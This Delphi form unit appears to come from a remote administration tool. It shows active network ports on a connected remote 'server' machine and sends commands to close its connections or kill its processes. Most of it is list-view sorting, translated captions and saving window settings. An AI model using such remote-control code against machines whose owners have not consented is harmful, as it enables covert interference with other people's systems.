unit UnitActivePorts;

interface

uses
  StrUtils,Windows, Messages, SysUtils, Variants, Classes, Graphics, Controls, Forms,
  Dialogs, UnitMain, ComCtrls, Menus, UnitConexao, sSkinProvider;

type
  TFormActivePorts = class(TForm)
    StatusBar1: TStatusBar;
    AdvListView1: TListView;
    PopupMenu1: TPopupMenu;
    Atualizar1: TMenuItem;
    DNSResolve1: TMenuItem;
    Finalizarconexo1: TMenuItem;
    Finalizarprocesso1: TMenuItem;
    sSkinProvider1: TsSkinProvider;
    procedure FormCreate(Sender: TObject);
    procedure Atualizar1Click(Sender: TObject);
    procedure DNSResolve1Click(Sender: TObject);
    procedure Finalizarconexo1Click(Sender: TObject);
    procedure Finalizarprocesso1Click(Sender: TObject);
    procedure PopupMenu1Popup(Sender: TObject);
    procedure AdvListView1CustomDrawItem(Sender: TCustomListView; Item: TListItem;
      State: TCustomDrawState; var DefaultDraw: Boolean);
    procedure AdvListView1ColumnClick(Sender: TObject; Column: TListColumn);
    procedure FormClose(Sender: TObject; var Action: TCloseAction);
    procedure FormShow(Sender: TObject);
  private
    { Private declarations }
    Servidor: TConexaoNew;
    MinhaConexao: integer;
    NomePC: string;
    LiberarForm: boolean;
  	procedure WMCloseFree(var Message: TMessage); message WM_CLOSEFREE;
    procedure AtualizarIdioma;
    procedure ClickTheColumn;
  	procedure WMAtualizarIdioma(var Message: TMessage); message WM_ATUALIZARIDIOMA;
    procedure CreateParams(var Params : TCreateParams); override;
  public
    { Public declarations }
    procedure OnRead(Recebido: String; ConAux: TConexaoNew); overload;
    constructor Create(aOwner: TComponent; ConAux: TConexaoNew); overload;
  end;

var
  FormActivePorts: TFormActivePorts;

implementation

{$R *.dfm}

uses
  UnitStrings,
  CustomIniFiles,
  UnitConstantes,
  UnitCommonProcedures;

//procedure WMAtualizarIdioma(var Message: TMessage); message WM_ATUALIZARIDIOMA;
procedure TFormActivePorts.WMAtualizarIdioma(var Message: TMessage);
begin
  AtualizarIdioma;
end;

procedure TFormActivePorts.WMCloseFree(var Message: TMessage);
begin
  LiberarForm := True;
  Close;
end;

//Here's the implementation of CreateParams
procedure TFormActivePorts.CreateParams(var Params : TCreateParams);
begin
  inherited CreateParams(Params); //Don't ever forget to do this!!!
  if FormMain.ControlCenter = True then Exit;
  Params.WndParent := GetDesktopWindow;
end;

procedure TFormActivePorts.FormCreate(Sender: TObject);
begin
  Self.Left := (screen.width - Self.width) div 2 ;
  Self.top := (screen.height - Self.height) div 2;
  if AdvListView1.Items.Count > 0 then AdvListView1.Items.Clear;
end;

function TrimIP(IP: string): string;
var
  i: integer;
  TempStr: string;
begin
  TempStr := IP;
  for i := length(TempStr) downto 1 do
  if TempStr[i] = '.' then delete(TempStr, i, 1);
  try
    StrToInt64(TempStr);
    result := TempStr;
    except
    result := '';
  end;
end;

var
  LastSortedColumn: TListColumn;
  Ascending: boolean;

function SortByColumn(Item1, Item2: TListItem; Data: integer): integer; stdcall;
var
  n1,n2: int64;
  s1,s2: string;
  ex1,ex2: extended;
  num: integer;
  Date1,Date2: TDateTime;
begin
  if (LastSortedColumn.Index = 1) or
     (LastSortedColumn.Index = 2) or
     (LastSortedColumn.Index = 3) or
     (LastSortedColumn.Index = 4) or
     (LastSortedColumn.Index = 6) then
  begin
    if LastSortedColumn.Index = 1 then
    begin
       n1 := StrToIntDef(TrimIP(Item1.SubItems[0]), 0);
       n2 := StrToIntDef(TrimIP(Item2.SubItems[0]), 0);
    end;

     if LastSortedColumn.Index = 2 then
     begin
       n1 := StrToIntDef(Item1.SubItems[1], 0);
       n2 := StrToIntDef(Item2.SubItems[1], 0);
     end;

    if LastSortedColumn.Index = 3 then
    begin
       n1 := StrToIntDef(TrimIP(Item1.SubItems[2]), 0);
       n2 := StrToIntDef(TrimIP(Item2.SubItems[2]), 0);
    end;

     if LastSortedColumn.Index = 4 then
     begin
       n1 := StrToIntDef(Item1.SubItems[3], 0);
       n2 := StrToIntDef(Item2.SubItems[3], 0);
     end;

     if LastSortedColumn.Index = 6 then
     begin
       n1 := StrToIntDef(Item1.SubItems[5], 0);
       n2 := StrToIntDef(Item2.SubItems[5], 0);
     end;

    if (n1 = n2) then Result := 0 else if (n1 > n2) then Result := 1 else Result := -1;
  end else
  begin
    Result := 0;
    if Data = 0 then Result := AnsiCompareText(Item1.Caption, Item2.Caption)
    else Result := AnsiCompareText(Item1.SubItems[Data-1],Item2.SubItems[Data-1]);
  end;

  if not Ascending then Result := -Result;
end;

procedure TFormActivePorts.ClickTheColumn;
begin
  if LastSortedColumn = nil then exit;
  AdvListview1.CustomSort(@SortByColumn, LastSortedColumn.Index);
end;

procedure TFormActivePorts.AdvListView1ColumnClick(Sender: TObject;
  Column: TListColumn);
var
  i: integer;
begin
  Ascending := not Ascending;
  if Column <> LastSortedColumn then Ascending := not Ascending;
  for i := 0 to AdvListview1.Columns.Count -1 do AdvListview1.Column[i].ImageIndex := -1;
  LastSortedColumn := Column;
  AdvListview1.CustomSort(@SortByColumn, LastSortedColumn.Index);
end;

procedure TFormActivePorts.AtualizarIdioma;
begin
  AdvlistView1.Column[0].Caption := traduzidos[410];
  AdvlistView1.Column[1].Caption := traduzidos[411];
  AdvlistView1.Column[2].Caption := traduzidos[412];
  AdvlistView1.Column[3].Caption := traduzidos[413];
  AdvlistView1.Column[4].Caption := traduzidos[414];
  AdvlistView1.Column[5].Caption := traduzidos[418];
  AdvlistView1.Column[6].Caption := traduzidos[214];
  AdvlistView1.Column[7].Caption := traduzidos[213];

  DNSResolve1.Caption := traduzidos[408];
  Finalizarconexo1.Caption := traduzidos[409];

  Finalizarprocesso1.Caption := traduzidos[225];
  Atualizar1.Caption := traduzidos[192];
end;

constructor TFormActivePorts.Create(aOwner: TComponent; ConAux: TConexaoNew);
var
  TempStr: WideString;
  IniFile: TIniFile;
begin
  inherited Create(aOwner);
  Servidor := ConAux;
  NomePC := Servidor.NomeDoServidor;

  TempStr := ExtractFilePath(ParamStr(0)) + 'Settings\';
  ForceDirectories(TempStr);
  TempStr := TempStr + NomePC + '.ini';

  try
    IniFile := TIniFile.Create(TempStr, IniFilePassword);
    Width := IniFile.ReadInteger('ActivePorts', 'Width', Width);
    Height := IniFile.ReadInteger('ActivePorts', 'Height', Height);
    Left := IniFile.ReadInteger('ActivePorts', 'Left', Left);
    Top := IniFile.ReadInteger('ActivePorts', 'Top', Top);
    AdvListView1.Column[0].Width := IniFile.ReadInteger('ActivePorts', 'LV1_0', AdvListView1.Column[0].Width);
    AdvListView1.Column[1].Width := IniFile.ReadInteger('ActivePorts', 'LV1_1', AdvListView1.Column[1].Width);
    AdvListView1.Column[2].Width := IniFile.ReadInteger('ActivePorts', 'LV1_2', AdvListView1.Column[2].Width);
    AdvListView1.Column[3].Width := IniFile.ReadInteger('ActivePorts', 'LV1_3', AdvListView1.Column[3].Width);
    AdvListView1.Column[4].Width := IniFile.ReadInteger('ActivePorts', 'LV1_4', AdvListView1.Column[4].Width);
    AdvListView1.Column[5].Width := IniFile.ReadInteger('ActivePorts', 'LV1_5', AdvListView1.Column[5].Width);
    AdvListView1.Column[6].Width := IniFile.ReadInteger('ActivePorts', 'LV1_6', AdvListView1.Column[6].Width);
    AdvListView1.Column[7].Width := IniFile.ReadInteger('ActivePorts', 'LV1_7', AdvListView1.Column[7].Width);
    IniFile.Free;
    except
    DeleteFile(TempStr);
  end;
end;

procedure TFormActivePorts.OnRead(Recebido: String; ConAux: TConexaoNew);
var
  Item: TListItem;
  TempStr, TempStr1: string;
  i: integer;
  Result: TSplit;
begin
  if Copy(Recebido, 1, posex('|', Recebido) - 1) = LISTADEPORTASPRONTA then
  begin
    delete(Recebido, 1, posex('|', Recebido));
    MinhaConexao := StrToInt(Copy(recebido, 1, posex('|', recebido) - 1));
    Delete(recebido, 1, posex('|', recebido));

    AdvListView1.Items.BeginUpdate;
    if AdvListView1.Items.Count > 0 then AdvListView1.Items.Clear;
    try
      while (recebido <> '') and (Visible = True) do
      begin
        TempStr := Copy(Recebido, 1, posex(#13#10, Recebido) - 1);
        delete(Recebido, 1, posex(#13#10, Recebido) + 1);
        Result := SplitString(TempStr, delimitadorComandos);
        Item := AdvListView1.Items.Add;
        Item.ImageIndex := 100;

        if StrToInt(Result[6]) = MinhaConexao then Item.Data := TObject(ClRed);

        Item.Caption := Result[0];
        Item.SubItems.Add(Result[1]);
        Item.SubItems.Add(Result[2]);
        Item.SubItems.Add(Result[3]);
        Item.SubItems.Add(Result[4]);
        Item.SubItems.Add(Result[5]);
        Item.SubItems.Add(Result[6]);
        Item.SubItems.Add(Result[7]);
      end;
      for i := AdvListView1.Items.Count - 1 downto 0 do
      try
        if StrToInt(AdvListView1.Items.Item[i].SubItems.Strings[1]) > 65535 then AdvListView1.Items.Item[i].Delete else
        if StrToInt(AdvListView1.Items.Item[i].SubItems.Strings[3]) > 65535 then AdvListView1.Items.Item[i].Delete else
        if StrToInt(AdvListView1.Items.Item[i].SubItems.Strings[5]) > 65535 then AdvListView1.Items.Item[i].Delete; // li em uma matéria que o maior número de PID é 65535... se der problema tirar essa linha
        except
        continue;
      end;
      finally
      AdvListView1.Items.EndUpdate;
    end;
    StatusBar1.Panels.Items[0].Text := traduzidos[404];
  end else

  if copy(recebido, 1, posex('|', recebido) - 1) = FINALIZARCONEXAO then
  begin
    delete(recebido, 1, posex('|', recebido));

    TempStr := copy(recebido, 1, posex('|', recebido) - 1);
    delete(recebido, 1, posex('|', recebido));

    TempStr1 := copy(recebido, 1, posex('|', recebido) - 1);
    delete(recebido, 1, posex('|', recebido));

    if copy(recebido, 1, posex('|', recebido) - 1) = 'T' then
    StatusBar1.Panels.Items[0].Text := Traduzidos[406] + ' "' + TempStr + '<--->' + TempStr1 + '"' else
    StatusBar1.Panels.Items[0].Text := Traduzidos[407] + ' "' + TempStr + '<--->' + TempStr1 + '"';
  end else

  if copy(recebido, 1, posex('|', recebido) - 1) = FINALIZARPROCESSOPORTAS then
  begin
    delete(recebido, 1, posex('|', recebido));
    if copy(recebido, 1, posex('|', recebido) - 1) = 'Y' then
    begin
      delete(recebido, 1, posex('|', recebido));
      TempStr := copy(recebido, 1, posex('|', recebido) - 1);
      for i := AdvListView1.Items.Count - 1 downto 0 do
      if AdvListView1.Items.Item[i].SubItems.Strings[5] = TempStr then AdvListView1.Items.Delete(i);
      StatusBar1.Panels.Items[0].Text := Traduzidos[198] + ' PID(' + TempStr + ') ' + Traduzidos[199];
    end else
    begin
      delete(recebido, 1, posex('|', recebido));
      TempStr := copy(recebido, 1, posex('|', recebido) - 1);
      StatusBar1.Panels.Items[0].Text := Traduzidos[198] + ' PID(' + TempStr + ') ' + Traduzidos[200];
    end
  end else

end;

procedure TFormActivePorts.Atualizar1Click(Sender: TObject);
begin
  if DNSResolve1.Checked = false then
  Servidor.EnviarString(LISTARPORTAS + '|') else
  Servidor.EnviarString(LISTARPORTASDNS + '|');
  StatusBar1.Panels.Items[0].Text := traduzidos[205];
end;

procedure TFormActivePorts.DNSResolve1Click(Sender: TObject);
begin
  DNSResolve1.Checked := not DNSResolve1.Checked;
  Atualizar1Click(Atualizar1);
end;

procedure TFormActivePorts.AdvListView1CustomDrawItem(
  Sender: TCustomListView; Item: TListItem; State: TCustomDrawState;
  var DefaultDraw: Boolean);
begin
  if Item.Data <> nil then Sender.Canvas.Font.Color := TColor(Item.Data);
end;

procedure TFormActivePorts.Finalizarconexo1Click(Sender: TObject);
var
  TempInt: integer;
  i: integer;
  JaMostrei: boolean;
begin
  if AdvListView1.SelCount <= 0 then Exit;
  if MessageBox(Handle,
                pchar(traduzidos[415] + '?'),
                pchar(NomeDoPrograma + ' ' + VersaoDoPrograma),
                MB_ICONQUESTION or MB_YESNO or MB_SYSTEMMODAL or MB_SETFOREGROUND or MB_TOPMOST) <> idYes then Exit;

  JaMostrei := False;
  for I := AdvListView1.Items.Count - 1 downto 0 do
  if AdvListView1.Items.Item[i].Selected = True then
  begin
    try
      TempInt := StrToInt(AdvListView1.Items.Item[i].SubItems.Strings[5]);
      except
      continue;
    end;

    if TempInt = MinhaConexao then
    begin
      if JaMostrei = False then
      MessageBox(Handle,
                 pwidechar(Traduzidos[416]),
                 pWideChar(NomeDoPrograma + ' ' + VersaoDoPrograma),
                 MB_OK or MB_ICONWARNING or MB_SYSTEMMODAL or MB_SETFOREGROUND or MB_TOPMOST);
      JaMostrei := True;
    end else
    Servidor.EnviarString(FINALIZARCONEXAO + '|' +
                                    AdvListView1.Items.Item[i].SubItems[0] + '|' +
                                    AdvListView1.Items.Item[i].SubItems[1] + '|' +
                                    AdvListView1.Items.Item[i].SubItems[2] + '|' +
                                    AdvListView1.Items.Item[i].SubItems[3] + '|');
  end;
end;

procedure TFormActivePorts.Finalizarprocesso1Click(Sender: TObject);
begin
  if AdvListView1.SelCount <= 0 then Exit;
  if MessageBox(Handle,
                pchar(traduzidos[206] + '?'),
                pchar(NomeDoPrograma + ' ' + VersaoDoPrograma),
                MB_ICONQUESTION or MB_YESNO or MB_SYSTEMMODAL or MB_SETFOREGROUND or MB_TOPMOST) <> idYes then Exit;

  Servidor.EnviarString(FINALIZARPROCESSOPORTAS + '|' + AdvListView1.Selected.SubItems.Strings[5] + '|');
end;

procedure TFormActivePorts.FormShow(Sender: TObject);
begin
  AtualizarIdioma;
  Atualizar1Click(Atualizar1);
end;

procedure TFormActivePorts.PopupMenu1Popup(Sender: TObject);
var
  i: integer;
begin
  if AdvListView1.Selected = nil then
  for i := 0 to PopupMenu1.Items.Count - 1 do PopupMenu1.Items.Items[i].Enabled := false else
  for i := 0 to PopupMenu1.Items.Count - 1 do PopupMenu1.Items.Items[i].Enabled := true;
  Atualizar1.Enabled := true;
  DNSResolve1.Enabled := true;
  if AdvListView1.SelCount > 1 then Finalizarprocesso1.Enabled := False;
end;

procedure TFormActivePorts.FormClose(Sender: TObject; var Action: TCloseAction);
var
  TempStr: WideString;
  IniFile: TIniFile;
begin
  if LiberarForm then Action := caFree;

  AdvListView1.Items.Clear;

  TempStr := ExtractFilePath(ParamStr(0)) + 'Settings\';
  ForceDirectories(TempStr);
  TempStr := TempStr + NomePC + '.ini';

  try
    IniFile := TIniFile.Create(TempStr, IniFilePassword);
    IniFile.WriteInteger('ActivePorts', 'Width', Width);
    IniFile.WriteInteger('ActivePorts', 'Height', Height);
    IniFile.WriteInteger('ActivePorts', 'Left', Left);
    IniFile.WriteInteger('ActivePorts', 'Top', Top);
    IniFile.WriteInteger('ActivePorts', 'LV1_0', AdvListView1.Column[0].Width);
    IniFile.WriteInteger('ActivePorts', 'LV1_1', AdvListView1.Column[1].Width);
    IniFile.WriteInteger('ActivePorts', 'LV1_2', AdvListView1.Column[2].Width);
    IniFile.WriteInteger('ActivePorts', 'LV1_3', AdvListView1.Column[3].Width);
    IniFile.WriteInteger('ActivePorts', 'LV1_4', AdvListView1.Column[4].Width);
    IniFile.WriteInteger('ActivePorts', 'LV1_5', AdvListView1.Column[5].Width);
    IniFile.WriteInteger('ActivePorts', 'LV1_6', AdvListView1.Column[6].Width);
    IniFile.WriteInteger('ActivePorts', 'LV1_7', AdvListView1.Column[7].Width);
    IniFile.Free;
    except
    DeleteFile(TempStr);
  end;

end;

end.
